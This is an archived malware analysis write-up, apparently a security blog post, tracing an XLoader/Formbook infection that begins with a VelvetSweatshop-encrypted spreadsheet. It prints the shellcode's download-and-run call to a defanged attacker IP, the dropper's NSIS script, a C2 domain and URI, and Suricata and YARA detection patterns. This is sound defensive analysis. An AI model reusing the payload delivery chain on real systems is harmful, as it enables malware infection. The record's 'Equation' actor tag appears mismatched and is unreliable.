{
    "id": "ac48c4e7-3b32-4ac7-954c-36e479900886",
    "created_at": "2023-01-12T15:05:20.660843Z",
    "updated_at": "2025-03-27T02:08:00.095032Z",
    "deleted_at": null,
    "sha1_hash": "d5dfb186926d336b9df4b1416bfc163161a3b246",
    "title": "2022-02-11 - XLoader-Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:10Z",
    "file_modification_date": "2022-05-28T05:07:10Z",
    "file_size": 770615,
    "plain_text": "# XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets\n\n**[forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/](https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/)**\n\n### By Tony Lambert Posted 2022-02-11 Updated 2022-03-28 9 min read\n\n\nFebruary 11, 2022\n\n\n### Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc4 2fc8047185b8918/.\n\n## Triaging the File\n\n### MalwareBazaar gave us a head start in asserting the document is a XLSX file. We can confirm this with Detect-It-Easy and file .\n```\n  remnux@remnux:~/cases/xloader-doc$ diec TW0091.xlsx \n  filetype: Binary\n  arch: NOEXEC\n  mode: Unknown\n  endianess: LE\n  type: Unknown\n   archive: Microsoft Compound(MS Office 97-2003 or MSI\n  etc.)\n  remnux@remnux:~/cases/xloader-doc$ file TW0091.xlsx \n  TW0091.xlsx: CDFV2 Encrypted\n\n```\n\n-----\n\n### The file output indicates the XLSX file is encrypted, so step one is taking a crack at getting the decrypted document.\n\n## Decrypting the Spreadsheet\n\n### We can give a good first shot at finding the document password using msoffcrypto```\ncrack.py .\n  remnux@remnux:~/cases/xloader-doc$ msoffcrypto-crack.py\n  TW0091.xlsx \n  Password found: VelvetSweatshop\n\n And just like that, we got a little lucky! The password for this document is\nVelvetSweatshop, which has some significance in MS Office documents. For more info\n\n you can hit up Google, but the basic gist is that Office documents encrypted with the password VelvetSweatshop will automatically decrypt themselves when opened in Office. This is an easy way to encrypt documents for distribution without having to worry about passing a password to the receiving party.\n\n To decrypt the document, we can pass that password into msoffcrypto-tool .\n  remnux@remnux:~/cases/xloader-doc$ msoffcrypto-tool -p VelvetSweatshop\n  TW0091.xlsx decrypted.xlsx\n  remnux@remnux:~/cases/xloader-doc$ file decrypted.xlsx\n  decrypted.xlsx: Microsoft Excel 2007+\n\n Alright, now we have a decrypted document to work with!\n\n## Analyzing the Decrypted Spreadsheet\n\n### A good first step with any MS Office file is to check for macro-based things with olevba .\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/xloader-doc$ olevba decrypted.xlsx \n  olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools\n  ==========================================================================\n  =====\n  FILE: decrypted.xlsx\n  Type: OpenXML\n  No VBA or XLM macros found.\n\n### The output from olevba indicates there aren’t Visual Basic for Applications (VBA) macros or Excel 4.0 macros present. This leads me into thinking there may be OLE objects involved. We can take a look using oledump.py .\n  remnux@remnux:~/cases/xloader-doc$ oledump.py\n  decrypted.xlsx \n  A: xl/embeddings/oleObject1.bin\n  A1:    20 '\\x01Ole'\n  A2:   1643 '\\x01oLe10nAtIVe'\n\n So it looks like we’ve got an OLE object in the spreadsheet that doesn’t contain macro code. I’m leaning towards thinking it’s shellcode at this point. Since that A2 stream looks like it is larger, let’s extract it and see if xorsearch.py -W can help us find an entry point.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/xloader-doc$ oledump.py -d -s A2 decrypted.xlsx >\n  a2.dat\n  remnux@remnux:~/cases/xloader-doc$ file a2.dat \n  a2.dat: packed data\n  remnux@remnux:~/cases/xloader-doc$ xorsearch -W a2.dat \n  Found XOR 00 position 0000020E: GetEIP method 3 E9AE000000\n  Found ROT 25 position 0000020E: GetEIP method 3 E9AE000000\n  Found ROT 24 position 0000020E: GetEIP method 3 E9AE000000\n  Found ROT 23 position 0000020E: GetEIP method 3 E9AE000000\n\n### It looks like xorsearch found a GetEIP method at 0x20E in the A2 stream we exported. We can use this offset with scdbg to emulate shellcode execution and see if that is what downloads a subsequent stage. When looking at the report output from scdbg, we can see several familiar functions.\n\n```\n\n-----\n\n```\n401454 GetProcAddress(ExpandEnvironmentStringsW)\n401487 ExpandEnvironmentStringsW(%PUBLIC%\\vbc.exe, dst=12fb9c, sz=104)\n40149c LoadLibraryW(UrlMon)\n4014b7 GetProcAddress(URLDownloadToFileW)\n401505 URLDownloadToFileW(hxxp://2.58.149[.]229/namec.exe,\nC:\\users\\Public\\vbc.exe)\n40154d LoadLibraryW(shell32)\n401565 GetProcAddress(ShellExecuteExW)\n40156d unhooked call to shell32.ShellExecuteExW\n\n```\n\n-----\n\n### In the shellcode, the adversary uses ExpandEnvironmentStringsW to find the Public folder in Windows. Next, they use URLDownloadToFileW to retrieve content from\n```\nhxxp://2.58.149[.]229/namec.exe and write it to C:\\Users\\Public\\vbc.exe .\n\n Finally, they use ShellExecuteExW to launch vbc.exe .\n\n## Triaging vbc.exe\n\n### We’re not going to entirely reverse engineer vbc.exe tonight, but we can get some identifying information about it. To start off, let’s take a look at some details using file and pedump .\n  remnux@remnux:~/cases/xloader-doc$ file vbc.exe \n  vbc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer\n  self-extracting archive\n\n The file utility says that the EXE is a Nullsoft Installer archive. We can confirm this using a couple data points from pedump . First, we’ll want to look at the executable’s PE sections. The presence of a section named .ndata tends to indicate the EXE is a Nullsoft Installer. Also, the compiler information section of pedump output will show the executable was made with Nullsoft.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/xloader-doc$ pedump -S --packer vbc.exe \n  === SECTIONS ===\n   NAME     RVA   VSZ  RAW_SZ RAW_PTR nREL REL_PTR nLINE LINE_PTR  \n  FLAGS\n   .text    1000   5976   5a00   400   0    0   0    0 \n  60000020 R-X CODE\n   .rdata    7000   1190   1200   5e00   0    0   0    0 \n  40000040 R-- IDATA\n   .data    9000  1af98   400   7000   0    0   0    0 \n  c0000040 RW- IDATA\n   .ndata   24000   8000    0    0   0    0   0    0 \n  c0000080 RW- UDATA\n   .rsrc    2c000   900   a00   7400   0    0   0    0 \n  40000040 R-- IDATA\n  === Packer / Compiler ===\n   Nullsoft install system v2.x\n\n### To squeeze the last bit of information from the vbc.exe binary, we can unpack it using\n7z . To get the most information, including the NSIS configuration script, you’ll need a\n\n version that is several years old such as 15.05 like in this post. I went back and downloaded version 9.38.1 of p7zip-full, the Linux implementation of 7-zip.\n  remnux@remnux:~/cases/xloader-doc/zip$ p7zip_9.38.1/bin/7z x vbc.exe \n  7-Zip 9.38 beta Copyright (c) 1999-2014 Igor Pavlov 2015-01-03\n  p7zip Version 9.38.1 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,2\n  CPUs,ASM)\n  Processing archive: vbc.exe\n  Extracting 8yhm36shrfdb7m\n  Extracting mhwrt\n  Extracting lzxupx.exe\n  Extracting [NSIS].nsi\n\n```\n\n-----\n\n```\nEverything is Ok\nFiles: 4\nSize:    355002\nCompressed: 302002\nremnux@remnux:~/cases/xloader-doc/zip$ ll\ntotal 10452\ndrwxrwxr-x 3 remnux remnux  4096 Feb 11 23:30 ./\ndrwxrwxr-x 4 remnux remnux  4096 Feb 11 23:28 ../\n-rw-rw-r-- 1 remnux remnux 216666 Feb 11 03:22 8yhm36shrfdb7m\n-rw-rw-r-- 1 remnux remnux 125952 Feb 11 03:22 lzxupx.exe\n-rw-rw-r-- 1 remnux remnux  7486 Feb 11 03:22 mhwrt\n-rw-rw-r-- 1 remnux remnux  4898 Feb 11 21:54 '[NSIS].nsi'\ndrwx------ 6 remnux remnux  4096 Feb 11 23:28 p7zip_9.38.1/\n-rw-rw-r-- 1 remnux remnux 302002 Feb 11 21:54 vbc.exe\n\n```\n\n-----\n\n### We can take a look in the [NSIS].nsi script and see what content would be executed:\n```\nFunction .onGUIInit\n InitPluginsDir\n  ; Call Initialize_____Plugins\n  ; SetDetailsPrint lastused\n SetOutPath $INSTDIR\n File 8yhm36shrfdb7m\n File mhwrt\n File lzxupx.exe\n ExecWait \"$INSTDIR\\lzxupx.exe $INSTDIR\\mhwrt\"\n Abort\n FlushINI $INSTDIR\\churches\\forget.bin\n Pop $R5\n Push 31373\n CopyFiles $INSTDIR\\unknowns\\hemlock.bmp $INSTDIR\\arboretum\\bitsy\\chances.tif  ;\n$(LSTR_7)$INSTDIR\\arboretum\\bitsy\\chances.tif  ; \"Copy to \"\n Nop\n Exec $INSTDIR\\mightier\\audit\\kahuna.pdf\n CreateDirectory $INSTDIR\\sail\\hold\n GetFullPathName $7 $INSTDIR\\cloak.csv\n Nop\n DetailPrint rstykivsbfr\n Exch $1\n  ; Push $1\n  ; Exch\n  ; Pop $1\n SetErrorLevel 3\n CreateDirectory $INSTDIR\\manic\\sons\\folklore\n CreateDirectory $INSTDIR\\reaches\n CreateDirectory $INSTDIR\\scanning\\audit\n Nop\n ReadEnvStr $R2 TEMP\n DetailPrint sylsppbkgbyo\n Exch $8\n  ; Push $8\n  ; Exch\n  ; Pop $8\n Exch $R7\n  ; Push $R7\n  ; Exch\n  ; Pop $R7\n EnumRegKey $R5 HKLM oqyalkuqydrx 2236\n FileWriteByte $5 765\nFunctionEnd\n\n When the NSIS installer starts running, it will execute the commands in .onGUIInit . These three files get written:\n\n 8yhm36shrfdb7m mhwrt lzxupx.exe\n\n```\n\n-----\n\n### The installer then runs the command $INSTDIR\\lzxupx.exe $INSTDIR\\mhwrt, waiting for the result. After it finishes, an Abort command processes. The abort causes the installer code to immediately skip to the function .onGUIEnd . Since this function isn’t defined in this particular script, the installer ends immediately.\n\n## How Do We Know It’s XLoader/Formbook??\n\n### This is where analysis dried up for me via code and I started leaning on sandbox output. Specifically, I looked at the report from Hatching Triage here: https://tria.ge/220211- wmgqsaeegl/behavioral1. When parsing the output, I noticed the sandbox made some identification based on the Suricata Emerging Threats rule ET MALWARE FormBook CnC Checkin (GET). Let’s see if we can validate that using the rule criteria and PCAP data from the sandbox. You can grab the Emerging Threats rules here: https://rules.emergingthreats.net/OPEN_download_instructions.html. I downloaded the PCAP from Tria.ge.\n\n Once we unpack the rules, we can search them using grep -F to quickly find the alert criteria.\n\n\n-----\n\n```\nremnux@remnux:~/cases/xloader-doc/network/rules$ grep -F 'ET MALWARE FormBook\nCnC Checkin (GET)' *\nemerging-malware.rules:alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET\nMALWARE FormBook CnC Checkin (GET)\"; flow:established,to_server;\ncontent:\"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|\"; fast_pattern;\nhttp.method; content:\"GET\"; http.uri; content:\"/?\"; pcre:\"/^[A-Za-z0-9_-]{1,15}=\n(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]\n{3}=|[A-Za-z0-9+/]{4}))&[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z09+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&sql=\\d*)?\n$/R\"; http.connection; content:\"close\"; depth:5; endswith; http.header_names;\ncontent:\"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|\"; depth:22; endswith;\nreference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control;\nsid:2031412; rev:9; metadata:affected_product\nWindows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint,\ncreated_at 2017_12_19, deployment Perimeter, former_category MALWARE,\nmalware_family Formbook, performance_impact Moderate, signature_severity Major,\nupdated_at 2020_09_16;)\nemerging-malware.rules:alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET\nMALWARE FormBook CnC Checkin (GET)\"; flow:established,to_server;\ncontent:\"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|\"; fast_pattern;\nhttp.method; content:\"GET\"; http.uri; content:\"/?\"; pcre:\"/^[A-Za-z0-9_-]{1,15}=\n(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]\n{3}=|[A-Za-z0-9+/]{4}))&[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z09+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&sql=\\d*)?\n$/R\"; http.connection; content:\"close\"; depth:5; endswith; http.header_names;\ncontent:\"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|\"; depth:22; endswith;\nreference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control;\nsid:2031449; rev:9; metadata:attack_target Client_Endpoint, created_at\n2017_12_19, former_category MALWARE, performance_impact Moderate,\nsignature_severity Major, updated_at 2020_12_16;)\nemerging-malware.rules:alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET\nMALWARE FormBook CnC Checkin (GET)\"; flow:established,to_server;\ncontent:\"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|\"; fast_pattern;\nhttp.method; content:\"GET\"; http.uri; content:\"/?\"; pcre:\"/^[A-Za-z0-9_-]{1,15}=\n(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]\n{3}=|[A-Za-z0-9+/]{4}))&[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z09+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&sql=\\d*)?\n$/R\"; http.connection; content:\"close\"; depth:5; endswith; http.header_names;\ncontent:\"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|\"; depth:22; endswith;\nreference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control;\nsid:2031453; rev:9; metadata:attack_target Client_Endpoint, created_at\n2017_12_19, former_category MALWARE, performance_impact Moderate,\nsignature_severity Major, updated_at 2020_12_23;)\n\n```\n\n-----\n\n### The first big pattern in the rules, content:\"Connection|3a 20|close|0d 0a 0d 0a 00\n```\n00 00 00 00 00|\", is matched in a packet going to www.appleburyschool[.]com .\n\n Finally, the rest of the URI for the request matches a massive regular expression for Formbook/Xloader.\n/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]\n{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]\n{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]\n{4}))(?:&sql=\\d*)?$/R\n  /b80i/?\n  1bwhC=javT2wWCzY2TGjiLQcDYfNXvB4BbgLustNQoY/LvZGM3F6OzxMpM5exhHgP5m5g5&tB=TtdpPp\n  whOb1\n\n It’s also possible to validate findings using the memory dumps in Triage! One of the fields in Triage indicated a YARA rule tripped on the memory dump 636-73-0x00000000004000000x0000000000429000-memory.dmp, which can be downloaded. This is a memory dump\n\n from process ID 636 in that sandbox report, which corresponds to an evil lzxupx.exe process. Using yara-rules, we can see some evidence of Formbook:\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/xloader-doc$ yara-rules -s 636-73-0x0000000000400000  0x0000000000429000-memory.dmp \n  CRC32b_poly_Constant 636-73-0x0000000000400000-0x0000000000429000-memory.dmp\n  0x8bb7:$c0: B7 1D C1 04\n  ...\n  Formbook 636-73-0x0000000000400000-0x0000000000429000-memory.dmp\n  0x16ad9:$sqlite3step: 68 34 1C 7B E1\n  0x16bec:$sqlite3step: 68 34 1C 7B E1\n  0x16b08:$sqlite3text: 68 38 2A 90 C5\n  0x16c2d:$sqlite3text: 68 38 2A 90 C5\n  0x16b1b:$sqlite3blob: 68 53 D8 7F 8C\n  0x16c43:$sqlite3blob: 68 53 D8 7F 8C\n  ...\n\n### It looks like the contents of memory trip a YARA rules from JPCERT designed to detect Formbook in memory: https://github.com/Yara- Rules/rules/blob/master/malware/MalConfScan.yar#L381\n\n That’s all for now, folks, thanks for reading!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-11 - XLoader-Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets.pdf"
    ],
    "report_names": [
        "2022-02-11 - XLoader-Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535920,
    "ts_updated_at": 1743041280,
    "ts_creation_date": 1653714430,
    "ts_modification_date": 1653714430,
    "files": {
        "pdf": "https://archive.orkl.eu/d5dfb186926d336b9df4b1416bfc163161a3b246.pdf",
        "text": "https://archive.orkl.eu/d5dfb186926d336b9df4b1416bfc163161a3b246.txt",
        "img": "https://archive.orkl.eu/d5dfb186926d336b9df4b1416bfc163161a3b246.jpg"
    }
}